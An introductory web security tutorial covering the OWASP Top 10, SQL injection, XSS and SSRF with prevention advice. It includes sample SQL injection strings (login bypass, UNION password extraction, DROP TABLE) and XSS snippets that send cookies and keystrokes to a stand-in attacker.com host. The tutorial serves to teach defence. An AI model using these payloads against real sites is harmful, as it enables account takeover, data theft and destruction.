# Web Application Security Introduction

## Overview

Web applications are common attack targets due to their accessibility and the sensitive data they handle. Understanding common vulnerabilities is essential for both developers and security professionals.

## OWASP Top 10

The **Open Worldwide Application Security Project (OWASP)** maintains a list of the most critical web application security risks.

### 1. Broken Access Control

**What:** Users can access resources they shouldn't be able to access.

**Vulnerability Types:**
- **Privilege Escalation:** Regular user accesses admin functions
- **Horizontal Access Control:** User A accesses User B's data
- **Direct Object References:** Modifying URL ID to access other records

**Example:**
```
User A visits: /profile/user/123 (viewing own profile)
User A guesses: /profile/user/124 (views another user's profile!)
```

**Impact:** Unauthorized data access, account takeover

**Prevention:**
- Enforce authorization checks on every request
- Use role-based access control (RBAC)
- Fail securely (deny by default)
- Log access attempts

### 2. Cryptographic Failures

**What:** Sensitive data exposed due to weak or missing cryptography.

**Common Issues:**
- Storing passwords in plaintext
- Using weak hashing (MD5, SHA1)
- Unencrypted sensitive data at rest
- Unencrypted sensitive data in transit
- Using weak encryption algorithms

**Example:**
```
Database breach reveals passwords: "password123" stored as plaintext
Attacker can log in with revealed credentials
```

**Impact:** Account compromise, data theft, identity fraud

**Prevention:**
- Use strong encryption (AES-256)
- Hash passwords with bcrypt/scrypt
- Use HTTPS for all data in transit
- Encrypt sensitive data at rest
- Use secure key management

### 3. Injection

**What:** Untrusted data interpreted as executable code.

**Types:**
- **SQL Injection:** Attacker modifies SQL queries
- **Command Injection:** Attacker executes system commands
- **Template Injection:** Attacker injects template code
- **Expression Language Injection:** Server-side expression execution

### SQL Injection Deep Dive

**Definition:** Inserting SQL code into user input to modify database queries.

**Vulnerable Code:**
```php
// BAD - Concatenating user input directly
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
$result = mysqli_query($connection, $query);
```

**Attack:**
```
User enters: ' OR '1'='1
Query becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
Result: Returns ALL users (1=1 is always true)

User enters: ' UNION SELECT id, password, password FROM users; --
Query becomes: SELECT * FROM users WHERE username = '' UNION SELECT id, password, password FROM users; --'
Result: Returns password hashes
```

**Example Scenarios:**
```
Login Bypass:
Input: ' OR '1'='1' --
Result: Logs in as first user

Data Extraction:
Input: ' UNION SELECT table_name FROM information_schema.tables; --
Result: Reveals all table names

Data Modification:
Input: '; DROP TABLE users; --
Result: Deletes users table
```

**Prevention:**
```php
// GOOD - Using parameterized queries
$query = "SELECT * FROM users WHERE username = ?";
$stmt = $connection->prepare($query);
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

**Key:** Use prepared statements/parameterized queries

### 4. Insecure Design

**What:** Missing or ineffective security controls in application design.

**Issues:**
- No threat modeling
- Missing security requirements
- No authentication/authorization design
- Insecure default configurations

**Example:** Password reset without verification allows account takeover

### 5. Security Misconfiguration

**What:** Insecure default settings, incomplete setup, or improper configuration.

**Common Issues:**
- Default credentials not changed
- Unnecessary features enabled
- Outdated dependencies with known vulnerabilities
- Security headers missing
- Verbose error messages revealing system details
- Debug mode enabled in production

**Example:**
```
Admin panel accessible with default credentials: admin/admin
Server reveals version: "Server: Apache/2.4.41" (known vulnerabilities)
Detailed error messages expose database structure
```

### 6. Vulnerable & Outdated Components

**What:** Using libraries, frameworks, or dependencies with known vulnerabilities.

**Risk:** Public exploits available for old software versions

**Example:**
```
Application uses jQuery 1.6.2 (released 2011)
Vulnerability: XSS flaw discovered in security advisory
Attacker exploits known vulnerability
```

**Prevention:**
- Maintain inventory of dependencies
- Monitor for security updates
- Use dependency scanning tools
- Update regularly

### 7. Authentication & Session Management Failures

**What:** Attackers can compromise user accounts and sessions.

**Issues:**
- Weak password requirements
- Predictable session tokens
- Session fixation (forcing user to use attacker's session ID)
- No timeout for sessions
- Plain text passwords in transit

**Example:**
```
Session cookie: SESSIONID=12345 (predictable)
Attacker guesses: SESSIONID=12346
Attacker gains access to other user's session
```

### 8. Software & Data Integrity Failures

**What:** CI/CD pipeline, dependencies, or data updates compromised.

**Issues:**
- Unencrypted deployment channels
- Unsigned dependencies
- Compromised plugins/extensions
- Insecure software update mechanisms

**Impact:** Malware distribution, backdoor installation

### 9. Logging & Monitoring Failures

**What:** Insufficient logging allows attacks to go undetected.

**Issues:**
- Failed login attempts not logged
- No security event logging
- Logs not monitored or analyzed
- Logs easily deleted
- Inadequate retention

**Impact:** Attackers evade detection, breach discovery delayed

### 10. Server-Side Request Forgery (SSRF)

**What:** Application fetches remote resources without proper validation.

**Vulnerability:**
```
User provides URL: http://attacker.com
Server fetches URL without validation
Attacker tricks server into: http://127.0.0.1:6379 (internal Redis)
Attacker accesses internal resources
```

**Risk:** Internal network access, cloud metadata exposure

## Cross-Site Scripting (XSS)

### Definition

**XSS (Cross-Site Scripting):** Injecting malicious JavaScript code into a web page that executes in users' browsers.

### Types of XSS

#### Stored XSS (Persistent)

Malicious script permanently stored in database. Executes every time page loaded.

**Scenario:**
```html
1. Attacker posts comment on blog:
   <script>alert('Hacked!')</script>

2. Blog stores comment in database

3. Every visitor to blog sees malicious script execute

4. Attacker could steal cookies:
   <script>
   new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;
   </script>
```

**Impact:** Affects all users, persistent threat

#### Reflected XSS (Non-Persistent)

Malicious script in URL parameter, executes once in victim's browser.

**Scenario:**
```
1. Attacker crafts malicious link:
   http://example.com/search?q=<script>alert('XSS')</script>

2. Attacker sends to victim

3. Victim clicks link

4. Server reflects search parameter in response:
   "You searched for: <script>alert('XSS')</script>"

5. Victim's browser executes script
```

**Impact:** Single victim per link, but attackers can distribute via email/social media

#### DOM-Based XSS

Malicious script manipulates page's Document Object Model (DOM) on client-side.

**Scenario:**
```javascript
// Vulnerable code
var userInput = location.hash.substring(1);  // Get URL fragment
document.getElementById('user').innerHTML = userInput;

// Attacker URL: http://example.com#<img src=x onerror="alert('XSS')">
// innerHTML executes script
```

### XSS Attack Examples

#### Session Stealing
```javascript
<script>
  // Steal session cookie and send to attacker
  fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### Keylogging
```javascript
<script>
  document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
  });
</script>
```

#### Malware Distribution
```html
<script>
  var img = new Image();
  img.src = "http://attacker.com/malware.exe";
  document.body.appendChild(img);
</script>
```

#### Redirecting to Phishing Site
```javascript
<script>
  window.location = 'http://attacker.com/fake-login';
</script>
```

### XSS Prevention

#### Input Validation
Reject suspicious input patterns.

```
Dangerous patterns: <script>, javascript:, onerror=, onclick=
```

#### Output Encoding
Escape special characters before displaying.

```html
<!-- Vulnerable -->
<div>User input: <%= userInput %></div>

<!-- Safe - escapes HTML special characters -->
<div>User input: <%= htmlEscape(userInput) %></div>

<!-- Input: <script>alert('XSS')</script> -->
<!-- Output: &lt;script&gt;alert('XSS')&lt;/script&gt; -->
<!-- Displayed as text, not executed -->
```

#### Content Security Policy (CSP)
Restrict which scripts can execute.

```html
<!-- Only allow scripts from same origin, no inline scripts -->
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'self'; style-src 'unsafe-inline'">
```

#### Use Security Libraries
Modern frameworks (React, Vue) auto-escape by default.

```javascript
// React auto-escapes by default - SAFE
<div>User input: {userInput}</div>

// XSS prevented automatically
```

## SQL Injection Prevention

### Parameterized Queries

```php
// PHP MySQLi
$query = "SELECT * FROM users WHERE email = ? AND active = ?";
$stmt = $connection->prepare($query);
$stmt->bind_param("si", $email, 1);
$stmt->execute();

// Java PreparedStatement
String query = "SELECT * FROM users WHERE email = ? AND active = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, email);
stmt.setInt(2, 1);
ResultSet rs = stmt.executeQuery();

// Python
query = "SELECT * FROM users WHERE email = %s AND active = %s"
cursor.execute(query, (email, 1))
```

### Input Validation

```php
// Whitelist valid input
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    throw new Exception("Invalid email");
}

// Type checking
$id = (int) $_GET['id'];  // Force integer type
```

## Common Web Vulnerabilities Recap

| Vulnerability | Risk | Prevention |
|---------------|------|-----------|
| SQL Injection | Database compromise | Parameterized queries |
| XSS | Session theft, malware | Output encoding, CSP |
| Broken Auth | Account takeover | Strong passwords, MFA |
| Weak Crypto | Data theft | AES-256, HTTPS, bcrypt |
| CSRF | Unwanted actions | CSRF tokens, SameSite cookies |
| XXE | Information disclosure | Disable XML external entities |
| Broken Access | Unauthorized access | Authorization checks |

## Tools for Web Security Testing

- **Burp Suite:** Web proxy for intercepting/modifying requests
- **OWASP ZAP:** Automated vulnerability scanner
- **SQLMap:** SQL injection testing
- **XSSer:** XSS vulnerability scanner
- **Nikto:** Web server scanner

---

## Key Takeaways

✅ OWASP Top 10 represents most critical web security risks
✅ SQL Injection can lead to complete database compromise
✅ XSS allows attackers to execute code in users' browsers
✅ Proper input validation and output encoding prevent many attacks
✅ Use parameterized queries to prevent SQL injection
✅ Implement CSP to mitigate XSS attacks
✅ Security must be built into application design

---

## Next Steps

- Set up lab environment for testing
- Learn to use Burp Suite
- Practice identifying vulnerabilities
- Study secure coding practices
- Review OWASP guidelines
